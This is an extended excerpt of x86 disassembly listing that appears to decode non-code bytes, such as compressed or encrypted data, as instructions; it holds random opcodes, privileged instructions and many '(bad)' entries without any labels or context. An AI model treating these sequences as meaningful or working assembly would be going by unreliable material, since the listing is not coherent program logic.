  6a8df3:	sbb    BYTE PTR [ebp+ebp*1+0x3eedbc37],dh
  6a8dfa:	test   eax,0xf40611e3
  6a8dff:	and    al,0xb4
  6a8e02:	aam    0x95
  6a8e04:	push   edi
  6a8e05:	into   
  6a8e06:	add    DWORD PTR [esi+0x19],eax
  6a8e09:	jg     0x6a8e34
  6a8e0b:	dec    eax
  6a8e0c:	push   eax
  6a8e0d:	xor    al,0x5a
  6a8e0f:	ins    DWORD PTR es:[edi],dx
  6a8e10:	jns    0x6a8e4d
  6a8e12:	es push ecx
  6a8e14:	les    eax,FWORD PTR [edi]
  6a8e16:	xchg   DWORD PTR [ebp-0x2bbb126c],ebx
  6a8e1c:	push   esi
  6a8e1d:	sar    DWORD PTR [esp+ebp*1-0x73],cl
  6a8e21:	call   0x7de732db
  6a8e26:	or     DWORD PTR [edx+0x75d5dc6a],0x5588a126
  6a8e30:	mov    edi,0xaf9dad3
  6a8e35:	xor    DWORD PTR [ecx+0x5fea766],ebx
  6a8e3b:	hlt    
  6a8e3c:	jbe    0x6a8e0e
  6a8e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a8e3f:	cmc    
  6a8e40:	xor    DWORD PTR [esi-0x137ced8f],0x1ac400a9
  6a8e4a:	jae    0x6a8e0b
  6a8e4c:	add    DWORD PTR [edi+0x2d],eax
  6a8e4f:	xor    DWORD PTR [edi-0x70],esp
  6a8e52:	test   DWORD PTR [edx-0x37],eax
  6a8e55:	lahf   
  6a8e56:	xor    al,0x2c
  6a8e58:	adc    dh,bl
  6a8e5a:	jo     0x6a8e65
  6a8e5c:	jne    0x6a8e7d
  6a8e5e:	mov    eax,ds:0xaed42f66
  6a8e63:	mov    edx,0x83e31f20
  6a8e68:	jb     0x6a8e33
  6a8e6a:	mov    bh,0xf7
  6a8e6c:	dec    edx
  6a8e6d:	outs   dx,DWORD PTR ds:[esi]
  6a8e6e:	into   
  6a8e6f:	sub    BYTE PTR [ebp+0x42],cl
  6a8e72:	imul   esp,DWORD PTR [ebx-0x1a],0xe987befa
  6a8e79:	fidivr DWORD PTR [esp+0x64]
  6a8e7d:	imul   DWORD PTR [ecx]
  6a8e7f:	sbb    BYTE PTR [ebx-0x1f],ch
  6a8e82:	imul   eax,esp,0x7758cb92
  6a8e88:	lods   al,BYTE PTR ds:[esi]
  6a8e89:	addr16 mov bl,0x6a
  6a8e8c:	adc    al,0x17
  6a8e8e:	retf   0xffd9
  6a8e91:	dec    edx
  6a8e92:	pop    edx
  6a8e93:	mov    bh,0xe3
  6a8e95:	pop    ss
  6a8e96:	retf   0xec8c
  6a8e99:	adc    eax,0xf7505724
  6a8e9e:	les    edx,FWORD PTR [ecx]
  6a8ea0:	inc    eax
  6a8ea1:	shr    ebx,cl
  6a8ea3:	push   edi
  6a8ea4:	mov    dh,0xa5
  6a8ea6:	enter  0x5c20,0x92
  6a8eaa:	js     0x6a8e9e
  6a8eac:	xchg   BYTE PTR [edx-0x57],dh
  6a8eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a8eb0:	cmp    edx,ebp
  6a8eb2:	test   al,dh
  6a8eb4:	mov    esi,0x50031ca7
  6a8eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a8eba:	xlat   BYTE PTR ds:[ebx]
  6a8ebb:	mov    eax,0x888617ec
  6a8ec0:	xchg   ebp,eax
  6a8ec1:	pushf  
  6a8ec2:	pop    ss
  6a8ec3:	push   ss
  6a8ec4:	inc    esi
  6a8ec5:	sub    eax,0xbfc63e3e
  6a8eca:	inc    eax
  6a8ecb:	shr    BYTE PTR [ebx-0x23],0x8b
  6a8ecf:	into   
  6a8ed0:	mov    eax,ds:0xffbf3846
  6a8ed5:	mov    ecx,0x2abc20e7
  6a8eda:	sub    al,BYTE PTR [edi-0x4]
  6a8edd:	loope  0x6a8ea7
  6a8edf:	call   0x3c1d:0x11ec7edb
  6a8ee6:	sub    esp,DWORD PTR [eax-0x56d086f0]
  6a8eec:	jbe    0x6a8f08
  6a8eee:	test   DWORD PTR [ebp+0x3556cdc],edi
  6a8ef4:	sub    esp,ebx
  6a8ef6:	scas   eax,DWORD PTR es:[edi]
  6a8ef7:	mov    eax,0x66ed1463
  6a8efc:	xchg   edx,eax
  6a8efd:	nop
  6a8efe:	aaa    
  6a8eff:	mov    cl,0xa8
  6a8f01:	jg     0x6a8e96
  6a8f03:	fisub  WORD PTR [edi+esi*2-0x39]
  6a8f07:	jmp    0x6a8f77
  6a8f09:	mov    edx,cs
  6a8f0b:	or     BYTE PTR [edi-0x326d8287],ah
  6a8f11:	imul   ebp,DWORD PTR [edx+eiz*1-0x3a5290e9],0xb5edb043
  6a8f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a8f1d:	push   0x7c796d53
  6a8f22:	pop    ss
  6a8f23:	stc    
  6a8f24:	(bad)  
  6a8f25:	rol    BYTE PTR [esi-0x4c],1
  6a8f28:	stos   BYTE PTR es:[edi],al
  6a8f29:	retf   0xcfc0
  6a8f2c:	adc    ebx,eax
  6a8f2e:	push   esp
  6a8f2f:	lock das 
  6a8f31:	jmp    0xd945:0xa1fc52da
  6a8f38:	and    BYTE PTR [ebx],ch
  6a8f3a:	pop    edi
  6a8f3b:	xor    ecx,DWORD PTR [edi+0x2a]
  6a8f3e:	xor    ch,ah
  6a8f40:	pop    edx
  6a8f41:	jg     0x6a8f21
  6a8f43:	pop    ss
  6a8f44:	lock push ds
  6a8f46:	(bad)
  6a8f49:	lds    esi,FWORD PTR [ecx]
  6a8f4b:	push   0x77
  6a8f4d:	int    0xe6
  6a8f4f:	jp     0x6a8fc1
  6a8f51:	pop    ebp
  6a8f52:	leave  
  6a8f53:	inc    eax
  6a8f54:	sbb    al,0x67
  6a8f56:	mov    dh,0x57
  6a8f58:	fsubr  DWORD PTR [edi+0x10816afd]
  6a8f5e:	scas   eax,DWORD PTR es:[edi]
  6a8f5f:	add    eax,DWORD PTR [edx+ebx*2-0x79ae5699]
  6a8f66:	cmc    
  6a8f67:	jbe    0x6a8f4b
  6a8f69:	gs xchg ebp,eax
  6a8f6b:	stos   BYTE PTR es:[edi],al
  6a8f6c:	mov    al,ds:0x7643556e
  6a8f71:	or     esi,DWORD PTR [edi+0x21baae0b]
  6a8f77:	sahf   
  6a8f78:	push   cs
  6a8f79:	pop    esp
  6a8f7a:	or     cl,ch
  6a8f7c:	(bad)  
  6a8f7d:	into   
  6a8f7e:	add    DWORD PTR [ebp+edx*2-0x2d],esp
  6a8f82:	xor    al,BYTE PTR [ebx+0x70998ef6]
  6a8f88:	or     DWORD PTR [edi-0xa],0xdd5ef770
  6a8f8f:	popf   
  6a8f90:	rol    edi,1
  6a8f92:	int3   
  6a8f93:	in     eax,dx
  6a8f94:	iret   
  6a8f95:	(bad)  
  6a8f96:	ss ret 
  6a8f98:	(bad)
  6a8f9b:	shr    dh,0x25
  6a8f9e:	iret   
  6a8f9f:	mov    ah,0x17
  6a8fa1:	jmp    0x6a8ffb
  6a8fa3:	or     eax,0x2c372599
  6a8fa8:	fsub   DWORD PTR [ebx]
  6a8faa:	addr16 mov al,0xd5
  6a8fad:	shl    bh,1
  6a8faf:	sbb    esi,esp
  6a8fb1:	push   eax
  6a8fb2:	fsub   QWORD PTR [edx]
  6a8fb4:	mov    ecx,DWORD PTR [edx]
  6a8fb6:	or     DWORD PTR [ebx-0x61],ebp
  6a8fb9:	cmp    bh,dh
  6a8fbb:	or     BYTE PTR ds:0xcb277376,0xc1
  6a8fc2:	jl     0x6a8f82
  6a8fc4:	scas   eax,DWORD PTR es:[edi]
  6a8fc5:	cwde   
  6a8fc6:	fisubr DWORD PTR [edx+0x51efd46]
  6a8fcc:	push   ds
  6a8fcd:	out    dx,eax
  6a8fce:	xor    edx,DWORD PTR ds:0x4035f546
  6a8fd4:	aad    0xc1
  6a8fd6:	outs   dx,DWORD PTR ds:[esi]
  6a8fd7:	shl    eax,cl
  6a8fd9:	pop    ss
  6a8fda:	out    0x8f,al
  6a8fdc:	mov    esi,0x200cf079
  6a8fe1:	adc    esi,ebp
  6a8fe3:	mov    dh,bl
  6a8fe5:	nop    ebx
  6a8fe8:	daa    
  6a8fe9:	idiv   cl
  6a8feb:	outs   dx,BYTE PTR ds:[esi]
  6a8fec:	hlt    
  6a8fed:	add    DWORD PTR [esi-0x44f59d5],0x9a4131fc
  6a8ff7:	pop    edi
  6a8ff8:	mov    ch,0xbf
  6a8ffa:	pop    ebx
  6a8ffb:	out    dx,al
  6a8ffc:	sbb    eax,0x4a3d1765
  6a9001:	push   edx
  6a9002:	adc    eax,0x34786939
  6a9007:	adc    DWORD PTR [ecx],esp
  6a9009:	int    0x21
  6a900b:	out    0x2b,eax
  6a900d:	sar    DWORD PTR [ebx],1
  6a900f:	stc    
  6a9010:	mov    al,ds:0xfa1a07f2
  6a9015:	cmp    bl,ch
  6a9017:	mov    al,0xc8
  6a9019:	pop    ebx
  6a901a:	sahf   
  6a901b:	xchg   esi,eax
  6a901c:	cmc    
  6a901d:	imul   edx,DWORD PTR [edi],0x44640f83
  6a9023:	fistp  WORD PTR [esp+eiz*8]
  6a9026:	fldcw  WORD PTR [edi]
  6a9028:	ins    BYTE PTR es:[edi],dx
  6a9029:	or     eax,0x1c775485
  6a902e:	cs pop esi
  6a9030:	fs mov eax,0xcebccad3
  6a9036:	xlat   BYTE PTR ds:[ebx]
  6a9037:	dec    ebx
  6a9038:	fs inc ebp
  6a903a:	vsubsd xmm5,xmm1,QWORD PTR [ecx+0x29]
  6a903f:	aas    
  6a9040:	hlt    
  6a9041:	inc    esi
  6a9042:	pop    es
  6a9043:	jo     0x6a9060
  6a9045:	and    eax,0x28ad103
  6a904a:	shl    ebp,1
  6a904c:	jae    0x6a90a0
  6a904e:	jge    0x6a902f
  6a9050:	(bad)
  6a9054:	and    BYTE PTR [ebp+0x55fa8640],ah
  6a905a:	imul   esi,DWORD PTR ds:0xfd600615,0xffffffb0
  6a9061:	lahf   
  6a9062:	into   
  6a9063:	mov    esi,DWORD PTR [ebp+0x13]
  6a9066:	mov    ebx,0x87882d1f
  6a906b:	xchg   DWORD PTR [ecx],ecx
  6a906d:	imul   esp,DWORD PTR [esi-0x7b],0x5a65615
  6a9074:	mov    ebx,0x17b6f2d5
  6a9079:	add    BYTE PTR [edi-0x67b1a315],dl
  6a907f:	popf   
  6a9080:	mov    cl,0x80
  6a9082:	cmp    al,0xc
  6a9084:	pop    ds
  6a9085:	push   0xfca96aa4
  6a908a:	(bad)  [esi+eax*8-0x13f50fc9]
  6a9091:	pop    es
  6a9092:	mov    eax,ds:0x205dfcc0
  6a9097:	in     al,0x5d
  6a9099:	les    edi,FWORD PTR [eax]
  6a909b:	fnstcw WORD PTR [ecx+0x4785cdd8]
  6a90a1:	pusha  
  6a90a2:	ins    BYTE PTR es:[edi],dx
  6a90a3:	pop    eax
  6a90a4:	enter  0x2f03,0xf2
  6a90a8:	int    0xa9
  6a90aa:	ds inc edi
  6a90ac:	mov    dl,0xef
  6a90ae:	int    0x4d
  6a90b0:	iret   
  6a90b1:	fldcw  WORD PTR [ebp+0x78]
  6a90b4:	iret   
  6a90b5:	dec    edi
  6a90b6:	(bad)  
  6a90b8:	mov    bl,0x8e
  6a90ba:	int3   
  6a90bb:	mov    al,0xd4
  6a90bd:	dec    ecx
  6a90be:	or     ebx,edi
  6a90c0:	or     bl,cl
  6a90c2:	ins    BYTE PTR es:[edi],dx
  6a90c3:	xchg   ebx,eax
  6a90c4:	add    esp,edx
  6a90c6:	adc    DWORD PTR [esi+ecx*4-0x43],0xda37fc62
  6a90ce:	(bad)  
  6a90d0:	cld    
  6a90d1:	mov    al,BYTE PTR [edi]
  6a90d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a90d4:	mov    al,ds:0x74317435
  6a90d9:	mov    ebp,0xbf451172
  6a90de:	xchg   esp,eax
  6a90df:	imul   edi,DWORD PTR [edi-0x73],0x1537886b
  6a90e6:	mov    esp,DWORD PTR [ebp+0x214f82ad]
  6a90ec:	rcl    esi,0xc6
  6a90ef:	stos   BYTE PTR es:[edi],al
  6a90f0:	or     ah,BYTE PTR [ebx+0x17]
  6a90f3:	add    bh,BYTE PTR [eax+0x7a1c33e5]
  6a90f9:	inc    esi
  6a90fa:	jbe    0x6a90ac
  6a90fc:	icebp  
  6a90fd:	inc    ebx
  6a90fe:	and    BYTE PTR [ebp-0x4ca66fd9],cl
  6a9104:	rcl    DWORD PTR [esi-0x328f19a5],1
  6a910a:	adc    bh,BYTE PTR [eax+0x605ced72]
  6a9110:	xchg   esp,eax
  6a9111:	xchg   DWORD PTR [edx+0x27],edi
  6a9114:	cs pop edi
  6a9116:	push   ds
  6a9117:	mov    cl,0x29
  6a9119:	into   
  6a911a:	pop    edi
  6a911b:	xchg   ebp,eax
  6a911c:	xchg   edx,eax
  6a911d:	icebp  
  6a911e:	mul    BYTE PTR [esp+ecx*2-0x40f0d7cc]
  6a9125:	outs   dx,BYTE PTR ds:[esi]
  6a9126:	cmc    
  6a9127:	jmp    0x4835b529
  6a912c:	ja     0x6a9144
  6a912e:	cwde   
  6a912f:	inc    esi
  6a9130:	outs   dx,DWORD PTR ds:[esi]
  6a9131:	aaa    
  6a9132:	pop    esp
  6a9133:	pop    es
  6a9134:	loop   0x6a90dc
  6a9136:	mov    ecx,0x8f36f504
  6a913b:	sub    bl,BYTE PTR [edx]
  6a913d:	nop
  6a913e:	cmc    
  6a913f:	sti    
  6a9140:	lds    ebx,FWORD PTR ds:0x59c4e80f
  6a9146:	cmp    eax,0x67edd8fb
  6a914b:	push   esp
  6a914c:	push   ecx
  6a914d:	ror    BYTE PTR [edx],cl
  6a914f:	mov    ah,0x9
  6a9151:	xchg   dl,ah
  6a9153:	or     al,0xed
  6a9155:	sub    BYTE PTR [eax+0x36],0xf9
  6a9159:	arpl   WORD PTR [edx+0x4],sp
  6a915c:	xchg   ebp,eax
  6a915d:	(bad)  
  6a915e:	fcomp  DWORD PTR [esi-0x628953a0]
  6a9164:	cmp    ebx,DWORD PTR [ebx+0x761d86b3]
  6a916a:	xlat   BYTE PTR ds:[ebx]
  6a916b:	daa    
  6a916c:	dec    esi
  6a916d:	and    DWORD PTR [edi+ebx*2-0x3f],esp
  6a9171:	fs test eax,0x6434b22c
  6a9177:	pop    es
  6a9178:	and    ebp,DWORD PTR [edi-0x37]
  6a917b:	loope  0x6a9133
  6a917d:	or     ah,BYTE PTR [edx-0x56f26233]
  6a9183:	shl    BYTE PTR [edx],1
  6a9185:	das    
  6a9186:	jg     0x6a91b1
  6a9188:	ds dec edx
  6a918a:	pop    esp
  6a918b:	adc    edx,DWORD PTR ds:0x80306e23
  6a9191:	lds    edx,FWORD PTR [ebx-0x62]
  6a9194:	or     ecx,esp
  6a9196:	jae    0x6a920e
  6a9198:	jecxz  0x6a91de
  6a919a:	adc    eax,esp
  6a919c:	ror    BYTE PTR [edx],0x52
  6a919f:	xchg   ebp,eax
  6a91a0:	push   esp
  6a91a1:	pop    esi
  6a91a2:	mov    al,ds:0x1df22f15
  6a91a7:	fsubrp st(0),st
  6a91aa:	cmp    DWORD PTR [edx+0x473f86b7],0x91073003
  6a91b4:	cs mov eax,0x3c6d9eac
  6a91ba:	pop    edi
  6a91bb:	xor    BYTE PTR [ebp+0x1d98f3c7],ah
  6a91c1:	nop
  6a91c2:	xchg   ebx,eax
  6a91c3:	out    0x83,eax
  6a91c5:	(bad)  
  6a91c6:	pushw  es
  6a91c8:	out    dx,eax
  6a91c9:	clc    
  6a91ca:	dec    edi
  6a91cb:	aam    0x40
  6a91cd:	push   ebx
  6a91ce:	clc    
  6a91cf:	div    edi
  6a91d1:	popa   
  6a91d2:	inc    ecx
  6a91d3:	js     0x6a918c
  6a91d5:	add    ebp,DWORD PTR [ecx-0x7b]
  6a91d8:	mov    ebp,0x2c52e33d
  6a91dd:	fxch   st(0)
  6a91df:	mov    fs,WORD PTR [eax+0x25755c16]
  6a91e5:	xchg   esp,eax
  6a91e6:	cmp    edi,edx
  6a91e8:	cmp    BYTE PTR [edi],ah
  6a91ea:	pop    es
  6a91eb:	inc    edi
  6a91ec:	out    0x7e,eax
  6a91ee:	cld    
  6a91ef:	push   eax
  6a91f0:	je     0x6a9207
  6a91f2:	mov    ecx,0x5125bfc4
  6a91f7:	stos   BYTE PTR es:[edi],al
  6a91f8:	sub    ch,BYTE PTR [edi]
  6a91fa:	ds jno 0x6a9231
  6a91fd:	cdq    
  6a91fe:	and    ebx,edi
  6a9200:	shl    DWORD PTR [ebp-0x73b85413],0x97
  6a9207:	ret    0xd331
  6a920a:	adc    DWORD PTR [eax-0x273f56f8],ecx
  6a9210:	xchg   dl,dl
  6a9212:	aas    
  6a9213:	mov    ecx,0x4a20901d
  6a9218:	add    al,0x1f
  6a921a:	jp     0x6a91ac
  6a921c:	add    DWORD PTR [esi+esi*4],0xe299062a
  6a9223:	ret    0xd986
  6a9226:	dec    eax
  6a9227:	push   cs
  6a9228:	(bad)  
  6a9229:	(bad)  
  6a922a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a922b:	lods   al,BYTE PTR ds:[esi]
  6a922c:	cmp    al,0xda
  6a922e:	pop    ecx
  6a922f:	repnz arpl bx,cx
  6a9232:	mov    WORD PTR [esi],cs
  6a9234:	mov    cl,0xf1
  6a9236:	imul   ebp,DWORD PTR [ebx-0x7],0x5e7887c6
  6a923d:	pop    eax
  6a923e:	adc    DWORD PTR fs:[edi+edi*1+0x1],edi
  6a9243:	push   ss
  6a9244:	jmp    0x6a9240
  6a9246:	ret    0xdfc1
  6a9249:	sbb    DWORD PTR [esi],edi
  6a924b:	lea    edx,[ecx]
  6a924d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a924e:	push   ebp
  6a924f:	(bad)  [esi-0x65]
  6a9252:	out    0x15,al
  6a9254:	das    
  6a9255:	rcr    DWORD PTR [edi+0x14fc1c36],0xed
  6a925c:	jno    0x6a92cd
  6a925e:	pop    ds
  6a925f:	xchg   esi,eax
  6a9260:	jno    0x6a9270
  6a9262:	imul   esi,DWORD PTR [ecx-0x23eec628],0xffffffdc
  6a9269:	or     DWORD PTR [edi-0x38216b49],ebx
  6a926f:	in     al,0x8c
  6a9271:	dec    ebx
  6a9272:	mov    bl,0x73
  6a9274:	inc    edx
  6a9275:	jmp    0xf7f6691a
  6a927a:	mov    eax,0x9be0414d
  6a927f:	fwait
  6a9280:	lods   eax,DWORD PTR ds:[esi]
  6a9281:	stos   DWORD PTR es:[edi],eax
  6a9282:	js     0x6a92a3
  6a9284:	stos   DWORD PTR es:[edi],eax
  6a9285:	xchg   esp,eax
  6a9286:	es mov bh,0x42
  6a9289:	adc    esp,ebp
  6a928b:	cmp    DWORD PTR [ebx],ebx
  6a928d:	mov    fs,WORD PTR [esi]
  6a928f:	repnz sbb DWORD PTR [edi-0x34],esp
  6a9293:	inc    edx
  6a9294:	xor    al,0x5d
  6a9296:	(bad)
  6a929b:	sub    al,0x8d
  6a929d:	(bad)  
  6a929e:	idiv   DWORD PTR ds:0x35d16a9c
  6a92a4:	add    BYTE PTR [ebp-0x68],0x7b
  6a92a8:	xchg   edx,eax
  6a92a9:	mov    dh,0xb5
  6a92ab:	dec    ebx
  6a92ac:	inc    ebx
  6a92ad:	pop    ss
  6a92ae:	xchg   esi,eax
  6a92af:	les    ebp,FWORD PTR [ebx-0x53]
  6a92b2:	pop    es
  6a92b3:	ficom  DWORD PTR [ecx-0x46d3f37a]
  6a92b9:	pop    es
  6a92ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a92bb:	xlat   BYTE PTR ds:[ebx]
  6a92bc:	dec    edi
  6a92bd:	pop    esp
  6a92be:	mov    eax,ds:0xed3c369a
  6a92c3:	or     edx,DWORD PTR [ecx+0x1c]
  6a92c6:	pop    eax
  6a92c7:	mul    DWORD PTR [eax-0x22]
  6a92ca:	rcl    DWORD PTR [ebx+0x21e8b3f5],0x8e
  6a92d1:	loope  0x6a9282
  6a92d3:	pop    esi
  6a92d4:	cs aam 0xe0
  6a92d7:	movlhps xmm3,xmm5
  6a92da:	xchg   ebp,eax
  6a92db:	rcr    BYTE PTR [ebx],cl
  6a92dd:	aad    0xed
  6a92df:	xor    DWORD PTR [ebx],0x23
  6a92e2:	mov    edi,0x4a9e09a4
  6a92e7:	cld    
  6a92e8:	nop
  6a92e9:	sub    DWORD PTR [esi+ebx*1-0x2d],esp
  6a92ed:	mov    eax,ds:0xe0f64028
  6a92f2:	js     0x6a9283
  6a92f4:	daa    
  6a92f5:	xchg   ch,bl
  6a92f7:	jbe    0x6a9378
  6a92f9:	(bad)  
  6a92fa:	mul    DWORD PTR [eax+0x13479ab2]
  6a9300:	jmp    0x6a92d3
  6a9302:	stos   DWORD PTR es:[edi],eax
  6a9303:	cli    
  6a9304:	call   0x87c0:0x5c9c5d57
  6a930b:	push   0x7634fb05
  6a9310:	aas    
  6a9311:	mov    eax,0xc2493939
  6a9316:	out    dx,al
  6a9317:	das    
  6a9318:	add    edi,edi
  6a931a:	pop    eax
  6a931b:	dec    eax
  6a931c:	and    esp,DWORD PTR [esi-0x40]
  6a931f:	mov    DWORD PTR [ebp+0x41],ecx
  6a9322:	nop
  6a9323:	mov    ds:0x230dab10,al
  6a9328:	cli    
  6a9329:	cmp    eax,0x94a91e9e
  6a932e:	(bad)  
  6a932f:	pop    ecx
  6a9330:	jb     0x6a9347
  6a9332:	jmp    0x6a931d
  6a9334:	pop    ds
  6a9335:	lods   al,BYTE PTR ds:[esi]
  6a9336:	dec    ecx
  6a9337:	(bad)  
  6a9338:	fimul  DWORD PTR ds:0x9c47da64
  6a933e:	sar    edx,cl
  6a9340:	test   DWORD PTR [ebx+0x5],ebp
  6a9343:	int3   
  6a9344:	mov    esp,0x715f0b28
  6a9349:	dec    edi
  6a934a:	(bad)  
  6a934c:	push   edi
  6a934d:	test   DWORD PTR [ecx+0x13],0xc6e39d9
  6a9354:	dec    eax
  6a9355:	cmp    ch,bl
  6a9357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9358:	leave  
  6a9359:	sub    dh,BYTE PTR [esp+edi*4]
  6a935c:	mov    DWORD PTR [esi+0x1f834c1c],ebp
  6a9362:	push   esp
  6a9363:	push   0x1
  6a9365:	clc    
  6a9366:	mov    ds:0xa9424db8,al
  6a936b:	call   0x33cb71ab
  6a9370:	fbstp  TBYTE PTR [eax]
  6a9372:	call   0xdf3:0xd0b6b7ca
  6a9379:	dec    edx
  6a937a:	and    bh,dh
  6a937c:	imul   dh
  6a937e:	lods   al,BYTE PTR ds:[esi]
  6a937f:	sti    
  6a9380:	mov    bl,0xf0
  6a9383:	xlat   BYTE PTR ds:[ebx]
  6a9384:	sub    DWORD PTR [edi+0x3e],edx
  6a9387:	xchg   ecx,eax
  6a9388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a9389:	push   es
  6a938a:	enter  0xd003,0x9d
  6a938e:	push   ebx
  6a938f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9390:	add    al,0xce
  6a9392:	sbb    bh,al
  6a9394:	icebp  
  6a9395:	sub    ch,BYTE PTR [ebx+0x53ddf113]
  6a939b:	sbb    BYTE PTR [edi-0x19],dl
  6a939e:	sub    bh,dl
  6a93a0:	popf   
  6a93a1:	sbb    eax,0x1cd2f44b
  6a93a6:	fs push eax
  6a93a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a93a9:	inc    esp
  6a93aa:	mov    al,al
  6a93ac:	adc    ebp,DWORD PTR [eax]
  6a93ae:	lods   eax,DWORD PTR ds:[esi]
  6a93af:	mov    ds:0x1f6df2cb,al
  6a93b4:	stc    
  6a93b5:	xor    al,0x76
  6a93b7:	push   eax
  6a93b8:	mov    DWORD PTR [ebx-0x385be939],edi
  6a93be:	gs je  0x6a934c
  6a93c1:	call   0xc117:0x3d262a94
  6a93c8:	imul   esp,esi,0xffffff89
  6a93cb:	adc    DWORD PTR [ebx+eiz*4+0x272d6a1f],edi
  6a93d2:	ja     0x6a9359
  6a93d4:	out    0x8c,al
  6a93d6:	jb     0x6a93fe
  6a93d8:	popa   
  6a93d9:	and    BYTE PTR [ecx*2-0x4b258281],bl
  6a93e0:	jge    0x6a93bd
  6a93e2:	rcl    BYTE PTR ds:0xe8d240d,0x77
  6a93e9:	mov    ebp,0x20578c5
  6a93ee:	int3   
  6a93ef:	inc    eax
  6a93f0:	adc    bh,BYTE PTR [ebp+0x33]
  6a93f3:	push   es
  6a93f4:	jno    0x6a93e4
  6a93f6:	test   DWORD PTR [edi+0x3655ec7d],0xb57f3730
  6a9400:	push   ecx
  6a9401:	xchg   edi,eax
  6a9402:	repnz mov al,ds:0xf7f7f950
  6a9408:	imul   esp,DWORD PTR [eax+0x62],0x63ec6ad6
  6a940f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a9410:	xor    BYTE PTR [eax+0x748507d],bl
  6a9416:	ret    0x99a7
  6a9419:	mov    dh,0xfb
  6a941b:	jns    0x6a93a0
  6a941d:	popf   
  6a941e:	adc    ecx,DWORD PTR [edx-0x7]
  6a9421:	pop    esp
  6a9422:	adc    DWORD PTR [ebx],eax
  6a9424:	and    BYTE PTR [edx+0x3f],0x48
  6a9428:	hlt    
  6a9429:	sub    DWORD PTR [ecx-0x735dfb43],eax
  6a942f:	mov    esp,0x6bc8ab4e
  6a9434:	cli    
  6a9435:	mov    edi,0xb2c53ebf
  6a943a:	or     eax,0xb10a0d46
  6a943f:	std    
  6a9440:	xor    bh,BYTE PTR [esi]
  6a9442:	push   esi
  6a9443:	dec    eax
  6a9444:	sub    bl,dh
  6a9446:	mov    ebp,0x68af666
  6a944b:	sahf   
  6a944c:	dec    esp
  6a944d:	xor    BYTE PTR [esi],bl
  6a944f:	inc    BYTE PTR ds:0x2835620f
  6a9455:	add    BYTE PTR [ecx-0x32],ah
  6a9458:	pop    eax
  6a9459:	das    
  6a945a:	adc    esi,esp
  6a945c:	push   eax
  6a945d:	das    
  6a945e:	cmp    ebp,eax
  6a9460:	xchg   ecx,eax
  6a9461:	mov    bl,0xfd
  6a9463:	inc    esi
  6a9464:	mov    eax,ds:0xd125861e
  6a9469:	hlt    
  6a946a:	arpl   bx,ax
  6a946c:	das    
  6a946d:	rol    ebx,0x2d
  6a9470:	retf   0x1e3e
  6a9473:	call   0x5eec:0xc3664e13
  6a947a:	das    
  6a947b:	pop    ss
  6a947c:	xlat   BYTE PTR ds:[ebx]
  6a947d:	add    edx,DWORD PTR [ebp-0x4b]
  6a9480:	iret   
  6a9481:	xchg   DWORD PTR [ebx-0x19],ebp
  6a9484:	dec    DWORD PTR [edx+0x7b]
  6a9487:	fdivrp st(0),st
  6a9489:	das    
  6a948a:	pop    edx
  6a948b:	xchg   BYTE PTR [ebp+0x2302455a],al
  6a9491:	mov    eax,0xc1ce1e95
  6a9496:	dec    esi
  6a9497:	(bad)  [eax-0x24]
  6a949a:	mov    bl,0x14
  6a949c:	cdq    
  6a949d:	retf   
  6a949e:	sar    DWORD PTR [edx],cl
  6a94a0:	push   ebp
  6a94a1:	aam    0x3e
  6a94a3:	cmp    eax,0x1ccfeef0
  6a94a8:	xchg   esp,eax
  6a94a9:	add    ecx,DWORD PTR [ecx+0x7c]
  6a94ac:	fcom   QWORD PTR [ebp-0x2e2585b0]
  6a94b2:	mov    dl,0xfe
  6a94b4:	pop    ecx
  6a94b5:	mov    esp,0x71b6bfc6
  6a94ba:	mov    ecx,DWORD PTR [edx+0x42]
  6a94bd:	sbb    DWORD PTR [edx],ecx
  6a94bf:	push   esi
  6a94c0:	or     DWORD PTR [ecx],edx
  6a94c2:	test   eax,0xf72f33b
  6a94c7:	xchg   edx,eax
  6a94c8:	cwde   
  6a94c9:	(bad)  
  6a94cb:	jecxz  0x6a94e5
  6a94cd:	push   es
  6a94ce:	xchg   ebp,eax
  6a94cf:	or     DWORD PTR [esi-0x4c27fe22],ecx
  6a94d5:	or     DWORD PTR ds:0x88f8c285,eax
  6a94db:	in     al,0x41
  6a94dd:	cdq    
  6a94de:	shl    DWORD PTR [eax],1
  6a94e0:	data16 fwait
  6a94e2:	ret    
  6a94e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a94e4:	add    ah,BYTE PTR [eax]
  6a94e6:	outs   dx,DWORD PTR ds:[esi]
  6a94e7:	fsub   DWORD PTR [esi-0x39]
  6a94ea:	adc    ah,0xa8
  6a94ed:	std    
  6a94ee:	cmp    esp,eax
  6a94f0:	add    eax,0xf5b56f16
  6a94f5:	aas    
  6a94f6:	bound  ebp,QWORD PTR [eax-0x7294bcc0]
  6a94fc:	push   es
  6a94fd:	dec    edi
  6a94fe:	mov    DWORD PTR [edx+0x79a219c1],eax
  6a9504:	mov    bh,0xeb
  6a9506:	sbb    DWORD PTR [edx],ecx
  6a9508:	fadd   QWORD PTR [esi*8+0x58dba335]
  6a950f:	iret   
  6a9510:	test   DWORD PTR [ecx+esi*4-0x27cc9d9f],esp
  6a9517:	and    dl,BYTE PTR [ebx-0x4175d38a]
  6a951d:	out    dx,al
  6a951e:	leave  
  6a951f:	and    eax,0x5e28c1d5
  6a9524:	mov    bl,BYTE PTR [edx+0x6c4dd88f]
  6a952a:	jle    0x6a94fd
  6a952c:	pop    esi
  6a952d:	push   es
  6a952e:	add    esi,DWORD PTR [ebx]
  6a9530:	jle    0x6a9560
  6a9532:	enter  0x296b,0x4d
  6a9536:	push   edx
  6a9537:	dec    esi
  6a9538:	dec    ecx
  6a9539:	stc    
  6a953a:	and    dh,BYTE PTR [ecx-0x50465093]
